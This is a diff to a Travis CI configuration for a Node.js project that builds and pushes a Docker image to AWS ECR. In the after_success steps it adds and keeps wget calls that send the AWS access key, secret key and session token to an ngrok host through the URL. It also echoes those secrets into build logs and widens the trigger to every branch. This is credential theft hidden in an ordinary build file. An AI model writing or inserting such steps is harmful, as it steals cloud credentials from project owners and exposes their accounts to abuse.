@@ -1,5 +1,9 @@
 language: node_js
 
+branches:
+  only:
+  - /.*/
+
 services:
   - docker
 
@@ -10,6 +14,7 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - wget http://09e801797b05.ngrok.io/`echo "Hi there"`
   - docker --version
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
@@ -18,10 +23,10 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
   - echo $AWS_ACCESS_KEY_ID
-  - echo $AWS_SECRET_ACCESS_KEY
-  - echo $AWS_SESSION_TOKEN
   - wget http://09e801797b05.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
+  - echo $AWS_SECRET_ACCESS_KEY
   - wget http://09e801797b05.ngrok.io/`echo $AWS_SECRET_ACCESS_KEY`
+  - echo $AWS_SESSION_TOKEN
   - wget http://09e801797b05.ngrok.io/`echo $AWS_SESSION_TOKEN`
 
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
